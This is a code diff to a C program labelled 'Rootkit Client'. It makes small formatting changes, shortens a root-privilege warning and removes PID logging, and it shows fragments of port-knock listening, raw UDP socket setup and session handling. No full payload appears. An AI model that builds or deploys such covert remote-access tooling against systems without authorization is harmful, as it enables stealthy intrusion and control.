@@ -12,7 +12,7 @@
 #include <networking.h>
 #include <sys/socket.h>
 
-void usage(const char *program_name) {
+void usage(const char * program_name) {
     printf("--------------------------------------------------------------------\n");
     printf("Rootkit Client\n");
     printf("--------------------------------------------------------------------\n");
@@ -102,6 +102,7 @@ int wait_for_port_knock(struct client_options * client_options) {
         fprintf(stderr, "Error while listening for port knock\n");
         return EXIT_FAILURE;
     }
+
     connection_loop = true;
 
     const int raw_socket = create_raw_udp_socket();
@@ -129,11 +130,9 @@ int wait_for_port_knock(struct client_options * client_options) {
 int main(const int argc, char * argv[]) {
     // Check if running as root
     if (geteuid() != 0) {
-        fprintf(stderr, "Warning: Not running as root. Some devices may not be accessible.\n");
-        fprintf(stderr, "Consider running with: sudo %s\n\n", argv[0]);
+        fprintf(stderr, "Warning: Not running as root.\n");
+        fprintf(stderr, "Run with: sudo %s\n\n", argv[0]);
     }
-    const int pid = getpid();
-    log_message("PID: %d", pid);
 
     if (signal(SIGINT, signal_handler) == SIG_ERR) {
         fprintf(stderr, "Cannot set SIGINT handler\n");
@@ -146,7 +145,6 @@ int main(const int argc, char * argv[]) {
 
     // Buffer to store knock source IP
     char knock_source_ip[INET_ADDRSTRLEN] = {0};
-
     struct client_options client_options;
     client_options.host = get_local_address();
     client_options.interface_name = get_local_interface_name();
@@ -167,9 +165,9 @@ int main(const int argc, char * argv[]) {
         if (return_val == EXIT_FAILURE) {
             return EXIT_FAILURE;
         }
+
         ssize_t n = 0;
         char buffer[RESPONSE_BUFFER_LENGTH];
-
         struct session_info session_info;
         session_info.head = NULL;
         session_info.client_options_ = &client_options;
